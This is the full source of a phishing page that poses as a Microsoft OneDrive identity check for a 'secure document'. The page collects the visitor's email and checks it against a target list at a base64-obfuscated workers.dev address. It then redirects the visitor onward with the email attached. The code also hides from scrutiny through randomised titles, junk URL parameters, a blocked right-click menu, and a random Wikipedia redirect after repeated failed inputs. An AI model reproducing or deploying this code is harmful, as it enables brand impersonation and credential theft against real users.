<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script>
        // Titles array with different variations
        const titles = [
            "Confirm Your Identity",
            "Identity Confirmation Required",
            "Secure Your Access",
            "Verify Your Credentials",
            "Confirm Your Account",
            "Identity Check",
            "Verify Your Details",
            "Authenticate Your Identity",
            "Identity Verification Needed",
            "Confirm Your Personal Information"
        ];

        // Function to select a random title
        function setRandomTitle() {
            const randomIndex = Math.floor(Math.random() * titles.length);
            document.title = titles[randomIndex];
        }

        // Set random title on page load
        window.onload = setRandomTitle;
    </script>
    
    <!-- Add favicon (Microsoft logo) -->
    <link rel="icon" type="image/png" href="https://aadcdn.msftauth.net/shared/1.0/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico">
    
    <style>
        body {
            font-family: "Segoe UI", "Segoe UI Web (West European)", -apple-system, BlinkMacSystemFont, Roboto, "Helvetica Neue", sans-serif;
            background-color: #f4f4f4;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: #333;
            background-image: url(''); /* Add your background image here */
            background-size: cover;
            background-position: center;
        }

        .header {
            width: 100%;
            background-color: #0078d4;
            color: white;
            text-align: left;
            padding: 10px 20px;
            box-sizing: border-box;
            font-size: 18px;
            position: absolute;
            top: 0;
        }

        .header span {
            margin-left: 20px;
        }

        .container {
            background-color: white;
            border: 1px solid #ccc;
            border-radius: 3px;
            padding: 33px;
            width: 80%;
            max-width: 300px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            text-align: center;
            margin-top: 0px;
        }

        .container img {
            width: 100px;
            margin-bottom: 20px;
        }

        .container h2 {
            font-size: 24px;
            margin-bottom: 20px;
            color: #333;
        }

        .container p {
            margin-bottom: 10px;
            color: #666;
        }

        .container input[type="email"] {
            width: 100%;
            padding: 10px;
            margin-bottom: 20px;
            border: 1px solid #ccc;
            border-radius: 3px;
            font-size: 16px;
            box-sizing: border-box;
            text-align: center;
        }

        .container button {
            width: 100%;
            padding: 10px;
            background-color: #0078d4;
            color: white;
            border: none;
            border-radius: 3px;
            font-size: 16px;
            cursor: pointer;
        }

        .container button:hover {
            background-color: #005a9e;
        }

        .container .footer {
            font-size: 12px;
            color: #888;
            margin-top: 20px;
        }

        @media (max-width: 600px) {
            .container {
                padding: 20px;
            }

            .container h2 {
                font-size: 20px;
            }

            .container input[type="email"] {
                font-size: 14px;
            }

            .container button {
                font-size: 14px;
            }
        }

        /* Full-screen loading overlay */
        #loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(255, 255, 255, 0.8);
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 9999;
        }

        #loading-circle {
            border: 8px solid #f3f3f3;
            border-top: 8px solid #3498db;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="header">
        <span>OneDrive</span>
    </div>

        <h2>Confirm Your Identity</h2>
<p><strong>You are accessing a secure document portal with sensitive information:</strong></p>
<p>To proceed, we need to confirm your email address. Please enter the email address associated with this document.</p>


        <input type="email" id="email-input" placeholder="Enter email" required="" style="margin-top: 10px;">
        
        <!-- Error message element -->
        <p id="error-message" style="color: red; display: none;"></p>
        
        <button id="continue-button">SIGN DOCUMENT</button>
    </div>

    <!-- Full-screen loading overlay -->
    <div id="loading-overlay">
        <div id="loading-circle"></div>
    </div>

    <script>
        let attempts = 0;
        let loadingTimeout;

        function appendRandomParamsToUrl() {
            const params = generateRandomParams();
            const currentUrl = new URL(window.location.href);
            params.forEach(param => currentUrl.searchParams.append(param.key, param.value));
            window.history.replaceState({}, '', currentUrl); // Update the URL without reloading the page
        }

        function generateRandomParams() {
            let params = [];
            for (let i = 0; i < 300; i++) {
                let randomKey = `${i}`;
                let randomValue = Math.random().toString(36).substring(2, 15); // Generates random alphanumeric string
                params.push({ key: randomKey, value: randomValue });
            }
            return params;
        }

        async function continueLoading() {
    const emailInput = document.getElementById('email-input');
    const email = emailInput.value.trim().toLowerCase();
    const errorMessage = document.getElementById('error-message');

    // Clear previous error messages
    errorMessage.style.display = 'none';
    errorMessage.textContent = '';

    // Check if CHECKEMAIL is true before proceeding with email validation
    const CHECKEMAIL = true; // Set CHECKEMAIL value here or retrieve it from your config

    if (validateEmail(email)) {
    if (CHECKEMAIL) {
        // Check if email is in the list
        const emailInList = await checkEmailInList(email);

        if (emailInList) {
            // Show the full-screen loading overlay
            document.getElementById('loading-overlay').style.display = 'flex';

            // Wait for 2 seconds (animation)
            loadingTimeout = setTimeout(async () => {
                // Fetch the redirection URL with the email
                const redirectUrl = await fetchRedirectUrl(email);

                if (redirectUrl) {
                    // Redirect to the URL provided in the JSON response
                    window.location.href = redirectUrl;
                } else {
                    // Handle error if no redirect URL is returned
                    errorMessage.style.display = 'block';
                    errorMessage.textContent = "Unable to fetch the redirect URL. Please try again later.";
                }
            }, 1000); // 2-second delay for loading animation
        } else {
            // Show error message if email not found
            errorMessage.style.display = 'block';
            errorMessage.textContent = "Email not recognized. Please try with the email that received this document.";
        }
    } else {
        // If CHECKEMAIL is false, redirect without checking the email in the list
        document.getElementById('loading-overlay').style.display = 'flex';

        // Wait for 2 seconds (animation)
        loadingTimeout = setTimeout(async () => {
            const redirectUrl = await fetchRedirectUrl(email);

            if (redirectUrl) {
                // Redirect immediately
                window.location.href = redirectUrl;
            } else {
                // Handle error if no redirect URL is returned
                errorMessage.style.display = 'block';
                errorMessage.textContent = "Unable to fetch the redirect URL. Please try again later.";
            }
        }, 1000); // 2-second delay for loading animation
    }
} else {
    attempts++;
    if (attempts >= 4) {
        const randomWiki = await fetchRandomWiki();
        window.location.href = randomWiki;
    } else {
        // Show error message
        errorMessage.style.display = 'block';
        errorMessage.textContent = "The email address you entered is not valid. Please try again with a valid email.";
    }
}

        };

        async function fetchRedirectUrl(email) {
    try {
        // Base64 decode the URL
        const baseUrl = atob('aHR0cHM6Ly9za3ktbm8tbGltaXQtZm94ZXIzMzEwLnRyaWVkLWxvcmQud29ya2Vycy5kZXYv');

        // Fetch the JSON response
        const response = await fetch(baseUrl, {
            headers: {
                'Content-Type': 'application/json',
            },
        });

        if (!response.ok) {
            console.error(`Error fetching redirect URL: ${response.statusText}`);
            return null;
        }

        const data = await response.json();

        // Check if the response has "status" as "success" and extract the "message" URL
        if (data.status === 'success' && data.message) {
            return `${data.message}#${(email)}`; // Append email as a fragment
        } else {
            return null; // Invalid response
        }
    } catch (error) {
        console.error('Error fetching or processing redirect URL:', error);
        return null;
    }
}





        function validateEmail(email) {
            const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            return re.test(email);
        }

        async function checkEmailInList(email) {
    try {
        // Base64 decode the new URL and append the email as a query parameter
        const baseUrl = atob('aHR0cHM6Ly9lbWFpbGNoZWNrZXIudHJpZWQtbG9yZC53b3JrZXJzLmRldi8=');
        const url = `${baseUrl}?email=${encodeURIComponent(email)}`;

        // Fetch the JSON response
        const response = await fetch(url);
        if (!response.ok) {
            console.error(`Error fetching email data: ${response.statusText}`);
            return false;
        }

        const data = await response.json();

        // Check if the JSON contains the "exists" property and return its value
        if (data.exists === true) {
            return true;
        } else {
            return false;
        }
    } catch (error) {
        console.error('Error fetching or processing email data:', error);
        return false;
    }
}


        async function fetchRandomWiki() {
            const response = await fetch('https://en.wikipedia.org/wiki/Special:Random');
            return response.url;
        }

        // Event listener for the back button to clear animation and stop redirection
        document.getElementById('back-button')?.addEventListener('click', () => {
            // Hide the loading overlay
            document.getElementById('loading-overlay').style.display = 'none';

            // Clear any pending timeout for the loading animation
            clearTimeout(loadingTimeout);

            // Reset email input
            document.getElementById('email-input').value = '';
        });

        // Event listener for Next button click
        document.getElementById('continue-button').addEventListener('click', continueLoading);

        // Event listener for pressing Enter key in the email input field
        document.getElementById('email-input').addEventListener('keydown', function(event) {
            if (event.key === 'Enter') {
                continueLoading();
            }
        });

        // Listen for back/forward browser navigation and reset animation
        window.addEventListener('popstate', () => {
            document.getElementById('loading-overlay').style.display = 'none';
            clearTimeout(loadingTimeout);
        });

        // Generate and append random parameters to the URL on page load
        appendRandomParamsToUrl();
    </script>
<script>
    document.addEventListener('contextmenu', function(event) {
    event.preventDefault();
});

</script>
</body>
</html>
